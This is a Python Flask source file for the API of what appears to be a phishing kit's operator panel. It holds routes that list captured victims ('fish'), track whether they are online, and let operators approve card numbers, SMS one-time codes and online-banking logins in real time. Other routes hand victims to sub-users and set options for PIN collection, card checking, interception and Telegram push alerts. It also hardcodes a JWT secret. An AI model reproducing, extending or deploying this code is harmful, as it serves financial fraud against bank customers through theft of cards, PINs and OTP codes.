import traceback

import jwt
from flask import Blueprint, jsonify, request

from init import app
from models import User, Visit, Setting, Words
from util.authorize import login_required, admin_required
from util.redis_util import get_settings, set_settings, check_online

api = Blueprint("api", __name__, url_prefix="/api/v2")


# 检测在线状态
def watch_seesion(check_list):
    try:
        if check_list is not None:
            for i in check_list:
                if check_online(i) is None:
                    User.set_online(i, "离线")
                else:
                    User.set_online(i, "在线")
    except Exception as msg:
        print(msg)


# 进行中数据
@api.route("/fetch_pending_data", methods=["GET", "OPTION"])
@admin_required
def fetch_pending_data():
    try:
        page = int(request.args.get("page"))
        data_list = User.get_pending_data(page)
        watch_seesion(data_list[2])
        data_model = {
            "code": 20000,
            "data": {"items": data_list[0], "total": data_list[1]},
        }
        return jsonify(data_model)
    except Exception as msg:
        traceback.print_exc()
        print(msg)
        return "error"


# 已完成数据
@api.route("/fetch_finish_data", methods=["GET", "OPTION"])
@admin_required
def fetch_finish_data():
    try:
        data_list = User.get_finish_data()
        data_model = {
            "code": 20000,
            "data": {"items": data_list, "total": len(data_list)},
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"


# 设置卡片状态
@api.route("/set_card_status", methods=["GET", "OPTION"])
@login_required
def set_card_status():
    req_data = request.args
    login_info = {
        "id": req_data["id"],
        "status": req_data["status"],
    }
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        User.pass_card(login_info)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 设置短信状态
@api.route("/set_sms_status", methods=["GET", "OPTION"])
@login_required
def set_sms_status():
    req_data = request.args
    login_info = {
        "id": req_data["id"],
        "status": req_data["status"],
    }
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        User.pass_otp(login_info)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 设置网银状态
@api.route("/set_bank_status", methods=["GET", "OPTION"])
@login_required
def set_bank_status():
    req_data = request.args
    login_info = {
        "id": req_data["id"],
        "status": req_data["status"],
    }
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        User.pass_bank(login_info)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 删除数据
@api.route("/delete_data", methods=["POST"])
@admin_required
def delete_data():
    delete_id = []
    req_data = request.get_json()["id"]
    for i in req_data:
        delete_id.append(i["id"])
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        for i in delete_id:
            User.delete(i)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 基础数据
@api.route("/base_info", methods=["GET"])
@admin_required
def get_base_info():
    try:
        base_info = User.check_data_num()
        pass_message = {
            "code": 20000,
            "data": {"items": base_info},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 删除访客数据
@api.route("/delet_visit", methods=["GET"])
@admin_required
def delet_visit_records():
    try:
        Visit.delete_record()
        pass_message = {
            "code": 20000,
            "data": {"message": "ok"},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 读取设置
@api.route("/fetch_setting", methods=["GET"])
@admin_required
def fetch_setting():
    try:
        setings_dict = Setting.get_data()
        setings_dict["telegram_push"] = bool(int(setings_dict["telegram_push"]))
        setings_dict["limit_desktop"] = bool(int(setings_dict["limit_desktop"]))
        setings_dict["syn"] = bool(int(setings_dict["syn"]))
        setings_dict["intercept"] = bool(int(setings_dict["intercept"]))
        setings_dict["card_check"] = bool(int(setings_dict["card_check"]))
        setings_dict["show_filter"] = bool(int(setings_dict["show_filter"]))
        setings_dict["auto_send"] = bool(int(setings_dict["auto_send"]))
        setings_dict["pin_collect"] = bool(int(setings_dict["pin_collect"]))
        setings_dict["online_out_time"] = int(setings_dict["online_out_time"])
        pass_message = {
            "code": 20000,
            "data": {"settings": setings_dict},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/set_setting", methods=["POST"])
@admin_required
def set_setting():
    try:
        if request.method == "POST":
            req_data = request.get_json()
            for i in req_data:
                Setting.set_value(i, req_data[i])
            pass_message = {
                "code": 20000,
                "msg": "ok",
            }
            set_settings(Setting.get_data())
            print(get_settings())
            return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/get_syn", methods=["GET"])
def get_syn():
    try:
        syn_status = Setting.get_syn()
        pass_message = {
            "code": 20000,
            "data": {"status": syn_status},
        }
        return jsonify(pass_message)
    except Exception as msg:
        traceback.print_exc()
        error_msg = {
            "code": 40000,
            "data": {"status": True},
        }
        return jsonify(error_msg)


@api.route("/pull_fish", methods=["POST"])
@admin_required
def pull_fish():
    try:
        if request.method == "POST":
            fish_id = request.get_json()["id"]
            username = request.get_json()["username"]
            pass_message = {
                "code": 20000,
                "msg": "ok",
            }
            if User.set_can_see(str(fish_id), username):
                return jsonify(pass_message)
            else:
                return jsonify({"code": 40000, "msg": "error"})
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/reset_fish", methods=["POST"])
@admin_required
def reset_fish():
    try:
        if request.method == "POST":
            fish_id = request.get_json()["id"]
            pass_message = {
                "code": 20000,
                "msg": "ok",
            }
            if User.reset_can_see(str(fish_id)):
                return jsonify(pass_message)
            else:
                return jsonify({"code": 40000, "msg": "error"})
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/fetch_subuser_data", methods=["GET"])
@login_required
def fetch_subuser_data():
    try:
        auth = request.headers["X-TOKEN"]
        salt = "iv%i6xo7l8_t9bf_u!8#g#m*)*+ej@bek6)(@u3kh*42+unjv="
        username = jwt.decode(auth, salt, algorithms=["HS256"]).get("username")
        data_list = User.get_subuser_data(username)
        data_list.reverse()
        data_model = {
            "code": 20000,
            "data": {"items": data_list, "total": len(data_list)},
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"


# 获取文案配置
@api.route("/fetch_words_template", methods=["GET"])
@admin_required
def fetch_words_template():
    try:
        data_list = [x.__dict__ for x in Words.query.all()]
        for i in data_list:
            del i["_sa_instance_state"]
        data_model = {
            "code": 20000,
            "data": {"items": data_list, "total": len(data_list)},
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"


# 保存文案配置
@api.route("/save_words_template", methods=["POST"])
@admin_required
def save_words_template():
    try:
        save_data = request.get_json()
        print(save_data)
        Words.add_template(save_data)
        pass_message = {
            "code": 20000,
            "msg": "ok",
        }
        return jsonify(pass_message)
    except Exception as msg:
        print(msg)
        return "error"


# 前台获取配置
@api.route("/fetch_words", methods=["GET"])
def fetch_words():
    try:
        data_list = Words.query.filter(Words.choose == True).first().__dict__
        del data_list["_sa_instance_state"]
        del data_list["choose"]
        del data_list["id"]
        del data_list["name"]
        data_model = {
            "code": 20000,
            "data": data_list,
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"
